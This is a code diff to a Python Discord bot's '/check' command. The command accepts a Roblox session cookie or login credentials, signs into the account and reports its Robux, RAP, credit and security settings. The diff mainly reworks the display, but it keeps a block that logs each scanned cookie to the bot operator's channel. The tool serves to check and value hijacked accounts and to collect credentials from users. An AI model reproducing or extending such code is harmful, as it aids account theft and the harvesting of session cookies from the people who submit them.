@@ -1769,7 +1769,6 @@ async def check(interaction: discord.Interaction, cookie: str = None, username: 
             async with aiohttp.ClientSession() as s:
                 async with s.get("https://auth.roblox.com/v2/logout")  as r:
                     bot.xcsrf_token = r.headers.get("x-csrf-token", bot.xcsrf_token)
-
             auth_result = await get_cookie_from_login(username, password, interaction)
             if auth_result.get("captcha"):
                 captcha_url = "https://arkoselabs.com/demo"   # Placeholder
@@ -1789,7 +1788,6 @@ async def check(interaction: discord.Interaction, cookie: str = None, username: 
                 except asyncio.TimeoutError:
                     await init_msg.edit(embed=discord.Embed(title="⏰ Timed Out", color=discord.Color.red()))
                     return
-
                 await init_msg.remove_reaction("✅", interaction.user)
                 auth_result = await get_cookie_from_login(username, password, interaction, {
                     "token": "manual_captcha_solved",
@@ -1803,29 +1801,45 @@ async def check(interaction: discord.Interaction, cookie: str = None, username: 
         # Get user info
         info = await fetch_roblox_info(auth_result["cookie"])
 
-        embed = discord.Embed(title="🎮 Roblox Account Info", color=discord.Color.green())
+        embed = discord.Embed(title="Roblox Account Info", color=discord.Color.green())
         embed.set_thumbnail(url=f"https://www.roblox.com/headshot-thumbnail/image?userId={info['userid']}&width=420&height=420&format=png")
-        embed.add_field(name="Username", value=info["username"], inline=True)
-        embed.add_field(name="User ID", value=str(info["userid"]), inline=True)
-        embed.add_field(name="Description", value=f"```\n{info['description']}\n```", inline=False)
-        embed.add_field(name="Robux", value=str(info["robux"]), inline=True)
-        embed.add_field(name="RAP", value=str(info["rap"]), inline=True)
-        embed.add_field(name="Credit", value=f"${info['credit']}", inline=True)
-        embed.add_field(name="Premium", value="✅" if info["premium"] else "❌", inline=True)
-        embed.add_field(name="Email Verified", value="✅" if info["email_verified"] else "❌", inline=True)
-        embed.add_field(name="Phone Verified", value="✅" if info["phone_verified"] else "❌", inline=True)
-        embed.add_field(name="PIN Enabled", value="✅" if info["pin_enabled"] else "❌", inline=True)
-        embed.add_field(name="Inventory", value="[Public](https://www.roblox.com/users/{}/inventory/)".format(info["userid"]) if info["inv_public"] else "Private", inline=True)
+
+        embed.add_field(name="Username", value=info["username"], inline=False)
+        embed.add_field(name="User ID", value=str(info["userid"]), inline=False)
+
+        description = info['description'] if info['description'] else "N/A"
+        embed.add_field(name="Description", value=f"```\n{description}\n```", inline=False)
+
+        embed.add_field(name="Robux", value=str(info["robux"]), inline=False)
+        embed.add_field(name="RAP", value=str(info["rap"]), inline=False)
+        embed.add_field(name="Credit", value=f"${info['credit']}", inline=False)
+
+        premium_status = "Premium" if info["premium"] else "Non Premium"
+        embed.add_field(name="Membership", value=premium_status, inline=False)
+
+        email_status = "Verified" if info["email_verified"] else "Add Email"
+        embed.add_field(name="Email", value=email_status, inline=False)
+
+        phone_status = "Verified" if info["phone_verified"] else "Add Phone"
+        embed.add_field(name="Phone", value=phone_status, inline=False)
+
+        inventory_status = "[Public](https://www.roblox.com/users/{}/inventory/)".format(info["userid"]) if info["inv_public"] else "Private"
+        embed.add_field(name="Inventory", value=inventory_status, inline=False)
+
         if info["group"]:
             group = info["group"]
-            embed.add_field(name="Primary Group", value=f"[{group['name']}](https://www.roblox.com/groups/{group['id']})", inline=True)
+            embed.add_field(name="Primary Group", value=f"[{group['name']}](https://www.roblox.com/groups/{group['id']})", inline=False)
+        else:
+            embed.add_field(name="Primary Group", value="N/A", inline=False)
+
+        embed.set_footer(text="Neroniel")
         embed.timestamp = datetime.now(PH_TIMEZONE)
 
         await init_msg.edit(embed=embed)
 
-        # Log cookie (optional) 
-        if getattr(bot, "cookie_log_channel_id", 0) != 0:
-            log_channel = bot.get_channel(bot.cookie_log_channel_id)
+        # Optional: Log cookie 
+        if getattr(bot, "COOKIE_LOG_CHANNEL_ID", 0) != 0:
+            log_channel = bot.get_channel(bot.COOKIE_LOG_CHANNEL_ID)
             if log_channel:
                 log_embed = discord.Embed(title=f"{interaction.user} scanned a cookie", color=discord.Color.purple())
                 log_embed.add_field(name="Username", value=info["username"])
@@ -1834,7 +1848,7 @@ async def check(interaction: discord.Interaction, cookie: str = None, username: 
                 await log_channel.send(embed=log_embed)
 
     except Exception as e:
-        error_embed = discord.Embed(title="❌ Error", description=f"`{str(e)}`", color=discord.Color.red())
+        error_embed = discord.Embed(title="Error", description=f"`{str(e)}`", color=discord.Color.red())
         await init_msg.edit(embed=error_embed)
         print(f"[ERROR] /check: {e}")
 
